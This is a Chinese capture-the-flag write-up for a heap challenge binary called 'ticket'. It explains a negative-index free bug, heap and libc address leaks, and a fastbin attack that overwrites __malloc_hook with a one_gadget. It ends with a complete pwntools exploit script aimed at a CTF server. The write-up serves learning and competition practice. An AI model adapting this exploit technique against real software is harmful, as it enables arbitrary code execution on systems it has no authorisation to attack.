# ticket

## 漏洞分析

首先查看一下文件类型以及保护，64位elf文件，没有开启PIE。

```bash
$ checksec ./ticket
[*] '/home/...\ticket'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```


然后分析一下程序的逻辑。
初始化阶段，程序会将我们输入的name、word、age（age是一个int）的指针保存在bss段的堆数组上方。



然后就是找程序漏洞。add函数先对idx进行检查，然后输入size，然后将申请到的堆地址保存在bss段上&nbytes + idx + 4地址处，将size保存在&nbytes + idx + 0xA处。
计算可以知道堆地址数组的范围是0x6020a0-0x6020c8
size数组的范围是0x6020d0-0x6020f8，这是比较重要的一点，与我们后面利用有一定关联。

```c
add():
  puts("Index: ");
  idx = read_bss();
  if ( idx < 0 || idx > 5 )
  {
    puts("The cooperation was not very good!!!");
  }
  else if ( *(&nbytes + idx + 0xA) )            // size
  {
    puts("Ticket exist!!!");
  }
  else
  {
    puts("Remarks size: ");
    v2 = read_bss();
    if ( v2 < 0 || v2 > 0x200 )
    {
      puts("Don't speak too much");
    }
    else
    {
      *(&nbytes + idx + 4) = (size_t)malloc(v2);
      *(&nbytes + idx + 0xA) = v2;
      puts("It's ok!!!");
    }
  }
```

然后是delete函数，该函数有明显漏洞，在检查idx时只限制了大于3，输入可以是负数。

```c
puts("Index: ");
  v1 = read_bss();
  if ( v1 > 3 )//漏洞点
  {
    puts("The cooperation was not very good!!!");
  }
  else if ( *(&nbytes + v1 + 10) )
  {
    free((void *)*(&nbytes + v1 + 4));
    *(&nbytes + v1 + 10) = 0LL;
    puts("It's ok!!!");
  }
  else
  {
    puts("It's empty!!!");
  }
```

其他函数没有明显漏洞，show和edit前都会对对应size[idx]检查。防止了double free和UAF。
另外我们还能对初始时的name、word、age做一次修改和show_info。

## 利用思路

我们仔细观察bss段上的内存布局。发现可以通过delete（-2）的方式将buf，即我们输入name的堆块free，使进入fastbin中。但是注意在delete(-2)时会对size_list[-2]进行非零检查，size_list[-2]刚好是heap_list[4]，所以说我们事先申请一个idx=4的chunk，使满足size_list[-2]!=0就可以将buf free掉。

```
.bss:0000000000602080 nbytes
.bss:0000000000602088 age
.bss:0000000000602090 ; char *buf
.bss:0000000000602098 ; char *word
.bss:00000000006020A0 heap_list align 80h
.bss:00000000006020A0 _bss            ends
```

这个可以用来泄露出堆地址，先free一个0x20大小的chunk0，然后利用delete(-2)将buf释放掉，所以此时fastbin中buf->chunk0，然后通过show_info泄露出堆地址。

有了堆地址，就可以利用一次修改info的机会，在age中写入指向一个unsorted bin大小的堆指针，同样用delete(-3)将age中存储的堆释放，即拿到unsorted bin。再通过show泄露出libc基址。

由于libc版本是2.23。利用fastbin attack，从上述unsorted bin中切出一个0x70大小的chunk，就造成了堆块重叠，有两个指针指向该chunk。然后利用malloc_hook-0x23处的0x7f，申请到malloc_hook上方，写入one_gadget。

## wp

比赛的时候官方悄悄换了附件，痛失3血。

```python
from pwn import *
import LibcSearcher
context.log_level = 'debug'
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

def add(idx,size):
    sla('>> ','1')
    sla('Index:',str(idx))
    sla('size:',str(size))
def edit(idx,con):
    sla('>> ','3')
    sla('Index:',str(idx))
    sla('remarks:',con)
def delete(idx):
    sla('>> ','2')
    sla('Index:',str(idx))
def show(idx):
    sla('>> ','4')
    sla('Index:',str(idx))
def change_info(name,con,age):
    sla('>> ','5')
    sla('name: ',name)
    sla('fei): ',con)
    sla('age: ',str(age))
def show_info():
    sla('>> ','6')
#sh = process('./ticket')
sh = remote('node3.buuoj.cn',26857)
libc = ELF('./libc-2.23.so')
elf = ELF('./ticket')
sla('name: ','name')
sla('fei): ','con')
sla('age: ',str(0x602058))
add(0,0x20)
add(1,0x60)
add(2,0xf8)
add(3,0xf8)
add(4,0xf8)
delete(0)
delete(-2)
show_info()
ru('Name: ')
heap_addr = u64(rc(4).ljust(8,'\x00')) & 0xfffffff
print hex(heap_addr)
change_info('a','a',heap_addr+0xb0)
#gdb.attach(sh)

delete(-3)
show(2)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-88-0x3c4b20
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook  = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
system = libc_base + libc.sym['system']
add(0,0x60)
delete(0)
#gdb.attach(sh)
edit(2,p64(malloc_hook-0x23))
print hex(libc_base)
delete(3)
add(3,0x60)
add(0,0x60)
edit(0,'a'*0x13+p64(0xf1147+libc_base))

#gdb.attach(sh)
delete(3)
add(3,0x60)

ti()
```